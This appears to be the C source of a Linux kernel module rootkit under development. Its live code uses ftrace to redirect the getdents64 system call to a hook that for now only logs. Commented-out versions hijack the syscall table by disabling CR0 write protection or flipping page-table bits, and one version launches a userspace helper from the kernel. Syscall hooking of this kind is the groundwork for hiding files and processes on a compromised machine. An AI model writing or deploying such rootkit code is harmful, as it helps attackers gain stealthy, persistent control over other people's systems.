//#include <linux/init.h>
//#include <linux/module.h>
//#include <linux/syscalls.h>
//#include <linux/kernel.h>
//#include <linux/kallsyms.h>
//#include <asm/unistd.h>
//#include <linux/smp.h>
//#include <linux/preempt.h>
//
//static unsigned long *sys_call_table = NULL;
//static asmlinkage long (*original_call)(const struct pt_regs *);

//static asmlinkage long myGetDents(const struct pt_regs *regs) {
//    long ret = original_call(regs);
//    printk(KERN_INFO "Syscall was called\n");
//    return ret;
//}
//
//static unsigned long orig_cr0;
//
//static inline void unprotect_memory(void) {
//    unsigned long cr0;
//    preempt_disable();        // Disable preemption
//    barrier();                // Memory barrier
//    cr0 = read_cr0();
//    orig_cr0 = cr0;
//    cr0 &= ~X86_CR0_WP;      // Clear WP bit
//    barrier();                // Memory barrier
//    write_cr0(cr0);
//    barrier();                // Memory barrier
//}
//
//static inline void protect_memory(void) {
//    barrier();                // Memory barrier
//    write_cr0(orig_cr0);
//    barrier();                // Memory barrier
//    preempt_enable();         // Re-enable preemption
//}
//
///* Current solution would be to allow kallsyms_lookup_name in our Kernel, for the moment, and they maybe disable it and see how we can still have the same behavior
// *
// *  https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c
// * */
//
//static unsigned long **find_sys_call_table(void) {
//    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
//}
////static unsigned long **find_sys_call_table(void) {
////    unsigned long offset = PAGE_OFFSET;
////    unsigned long **sct;
////
////    while (offset < ULLONG_MAX) {
////        sct = (unsigned long **)offset;
////        if (sct[__NR_close] == (unsigned long ) sys_close) 
////            return sct;
////        offset += sizeof(void *);
////    }
////    return NULL;
////}
////
//
//
//static int hooking_syscall(void *hook_addr, uint16_t syscall_offset, unsigned long *sys_call_table)
//{
//    if (!hook_addr || !sys_call_table)
//        return -EINVAL;
//
//    printk(KERN_INFO "Attempting to hook syscall at offset %d\n", syscall_offset);
//    printk(KERN_INFO "Original address: %px\n", (void*)sys_call_table[syscall_offset]);
//    
//    unprotect_memory();
//    sys_call_table[syscall_offset] = (unsigned long)hook_addr;
//    protect_memory();
//    
//    printk(KERN_INFO "New address: %px\n", (void*)sys_call_table[syscall_offset]);
//    return 0;
//}
//
//static void unhooking_syscall(void *orig_addr, uint16_t syscall_offset)
//{
//	unprotect_memory();
//	sys_call_table[syscall_offset] = (unsigned long)orig_addr;
//	protect_memory();
//}
//
//static int __init rootkit_init(void) {
//
//    int ret;
//    
//    sys_call_table = (unsigned long*)find_sys_call_table();
//    if (!sys_call_table) {
//        printk(KERN_ERR "Failed to find syscall table\n");
//        return -EFAULT;
//    }
//
//    original_call = (void *)sys_call_table[__NR_getdents];
//    if (!original_call) {
//        printk(KERN_ERR "Failed to save original syscall\n");
//        return -EFAULT;
//    }
//
//
//    ret = hooking_syscall(myGetDents, __NR_getdents, sys_call_table);
//    if (ret < 0) {
//        printk(KERN_ERR "Failed to hook syscall\n");
//        return ret;
//    }
//    printk(KERN_INFO "Rootkit has been loaded\n");
//    char *argv[] = {"/start_companion", NULL};
//    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
//
//    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
//    printk("%i\n", r);
//    return 0;
//}
//
//static void rootkit_exit(void) {
//    unhooking_syscall(original_call, __NR_getdents);
//    printk(KERN_INFO "Rootkit has been unloaded\n");
//}
//
//module_init(rootkit_init);
//module_exit(rootkit_exit);
//
//MODULE_LICENSE("GPL");
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/unistd.h>
#include <linux/smp.h>
#include <linux/preempt.h>
#include <linux/vmalloc.h>
#include <linux/ftrace.h>

#pragma GCC optimize("-fno-optimize-sibling-calls")

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

static int find_sys_call_addr(struct ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "Failed to find syscall table\n");
        return 1;
    }
    *((unsigned long*) hook->original) = hook->address;
    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if(!within_module(parent_ip, THIS_MODULE))
        ((struct pt_regs *)(regs))->ip = (unsigned long) hook->function;
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = find_sys_call_addr(hook);
    if(err)
        return err;
    /* For many of function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

static asmlinkage long (*original_call)(const struct pt_regs *);

static asmlinkage long myGetDents(const struct pt_regs *regs) {
//    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->di;
    printk(KERN_INFO "Syscall was called\n");
    long ret = original_call(regs);
    printk(KERN_INFO "Syscall was called\n");
    return ret;
}

static  struct ftrace_hook f_hook = {
    .name = "__x64_sys_getdents64",
    .function = (myGetDents),
    .original = (&original_call),
  };

static int __init rootkit_init(void) {
    if (fh_install_hook(&f_hook)) {
      printk(KERN_INFO "Bruh minstall hook eroor\n");
   }
    printk(KERN_INFO "Rootkit has been loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hook(&f_hook);
    printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");

//static inline void write_cr0_force(unsigned long val) {
//    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
//}
//
//static inline void protect_memory(void) {
//    write_cr0_force(read_cr0() | (1 << 16));
//}
//
//static inline void unprotect_memory(void) {
//    write_cr0_force(read_cr0() & (~(1 << 16)));
//}

//static int make_rw(unsigned long address) {
//    unsigned int level;
//    pte_t *pte = lookup_address(address, &level);
//    if (pte == NULL) 
//        return -1;
//    if (pte->pte & ~_PAGE_RW) 
//        pte->pte |= _PAGE_RW;
//    return 0;
//}
//
//static int make_ro(unsigned long address) {
//    unsigned int level;
//    pte_t *pte = lookup_address(address, &level);
//    if (pte == NULL)
//        return -1;
//    pte->pte = pte->pte & ~_PAGE_RW;
//    return 0;
//}

//static void hooking_syscall(void *hook_addr, uint16_t syscall_offset)
//{
//    printk(KERN_INFO "Attempting to hook syscall at offset %d\n", syscall_offset);
//    printk(KERN_INFO "Original address: %px\n", ((void *)sys_call_table[syscall_offset]));
//    
//    make_rw((unsigned long)sys_call_table);
//    sys_call_table[syscall_offset] = (unsigned long)hook_addr;
//    make_ro((unsigned long)sys_call_table);
//    
//    printk(KERN_INFO "New address: %px\n", ((void *)sys_call_table[syscall_offset]));
//}

//static void unhooking_syscall(void *orig_addr, uint16_t syscall_offset)
//{
//    make_rw((unsigned long)sys_call_table);
//    sys_call_table[syscall_offset] = (unsigned long)orig_addr;
//    make_ro((unsigned long)sys_call_table);
//}
// For modern kernels we need this to find kernel symbols
//
//// CR0 write protection bypass
//static unsigned long original_cr0;
//
//static inline void write_cr0_forced(unsigned long val)
//{
//    unsigned long __force_order;
//
//    asm volatile(
//        "mov %0, %%cr0"
//        : "+r"(val), "+m"(__force_order));
//}
//
//static void disable_write_protect(void)
//{
//    original_cr0 = read_cr0();
//    write_cr0_forced(original_cr0 & ~0x00010000);
//}
//
//static void enable_write_protect(void)
//{
//    write_cr0_forced(original_cr0);
//}
//
//// Your original syscall function pointer
//static asmlinkage long (*original_syscall)(const struct pt_regs *);
//
//// Your hook function
//static asmlinkage long hook_syscall(const struct pt_regs *regs)
//{
//    // Your hook implementation here
//    return original_syscall(regs);
//}
//
//static int __init rootkit_init(void)
//{
//    // Find syscall table address using kallsyms
//    sys_call_table = (unsigned long**)lookup_name("sys_call_table");
//    
//    if (!sys_call_table) {
//        printk(KERN_INFO "Failed to find syscall table\n");
//        return -1;
//    }
//
//    printk(KERN_INFO "Found syscall table at %px\n", sys_call_table);
//
//    // Save original syscall
//    original_syscall = (void*)sys_call_table[__NR_mkdir]; // Replace with actual syscall number
//
//    // Disable write protection
//    disable_write_protect();
//    
//    // Replace with our hook
//    sys_call_table[__NR_mkdir] = (unsigned long*)hook_syscall;
//    
//    // Re-enable write protection
//    enable_write_protect();
//
//    return 0;
//}
//
//static void __exit rootkit_exit(void)
//{
//    if (sys_call_table) {
//        // Disable write protection
//        disable_write_protect();
//        
//        // Restore original syscall
//        sys_call_table[__NR_mkdir] = (unsigned long*)original_syscall;
//        
//        // Re-enable write protection
//        enable_write_protect();
//    }
//    
//    printk(KERN_INFO "Module unloaded\n");
//}
//
//module_init(rootkit_init);
//module_exit(rootkit_exit);
